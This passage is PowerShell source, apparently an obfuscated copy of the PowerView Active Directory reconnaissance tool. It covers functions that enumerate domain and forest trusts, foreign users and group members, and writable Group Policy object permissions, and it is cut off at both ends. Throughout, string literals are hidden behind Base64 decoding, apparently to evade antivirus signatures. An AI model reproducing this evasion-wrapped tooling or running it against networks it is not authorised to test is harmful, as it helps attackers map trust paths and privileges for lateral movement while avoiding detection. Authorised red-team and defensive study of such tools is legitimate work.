                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
            
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                
                $TargetDC = $Null
            }

            
            $PtrInfo = [IntPtr]::Zero

            
            $Flags = 63
            $DomainCount = 0

            
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdF0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlTmFtZQ=="))) $SourceDomain
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmFtZQ=="))) $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmV0Ymlvc05hbWU="))) $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmxhZ3M="))) $Info.Flags
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFyZW50SW5kZXg="))) $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RUeXBl"))) $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RBdHRyaWJ1dGVz"))) $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2lk"))) $SidString
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0R3VpZA=="))) $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSQ=="))))
                        $DomainTrust
                    }
                }
                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdF0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $Result).Message))
            }
        }
        else {
            
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVA=="))))
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $NetForestArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $NetForestArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvcmVzdFRydXN0Lk5FVA=="))))
                $_
            }
        }
    }
}


function Get-DomainForeignUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1lbWJlcm9mPSop")))
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))

                    if ($GroupDomain -ne $UserDomain) {
                        
                        $GroupName = $Membership.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRpc3Rpbmd1aXNoZWROYW1l"))) $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupDomain
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvcmVpZ25Vc2Vy"))))
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1lbWJlcj0qKQ==")))
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $Raw }
    }

    PROCESS {
        
        $ExcludeGroups = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcnM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIFVzZXJz"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz"))))

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))

            $_.member | ForEach-Object {
                
                
                $MemberDomain = $_.SubString($_.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                if (($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049Uy0xLTUtMjEuKi0uKg==")))) -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWU="))) $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvcmVpZ25Hcm91cE1lbWJlcg=="))))
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    
    $SeenDomains = @{}

    
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))] = $API }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))] = $NET }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

    
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdE1hcHBpbmddIEVudW1lcmF0aW5nIHRydXN0cyBmb3IgZG9tYWluOiAnJERvbWFpbg==")))

            
            $Null = $SeenDomains.Add($Domain, '')

            try {
                
                $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                
                if ($PsCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))) {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $ForestTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ForestTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdE1hcHBpbmddIEVycm9yOiB7MH0="))) -f $_)
            }
        }
    }
}


function Get-GPODelegation {


    [CmdletBinding()]
    Param (
        [String]
        $GPOName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpKGRpc3BsYXluYW1lPSRHUE9OYW1lKSk=")))
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ==")))
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU="))) -and $_.AccessControlType -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c="))) -and  $Exclusions -notcontains $_.IdentityReference.toString().split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1] -and $_.IdentityReference -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1JFQVRPUiBPV05FUg==")))}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURTUGF0aA=="))) $gpo.Properties.adspath
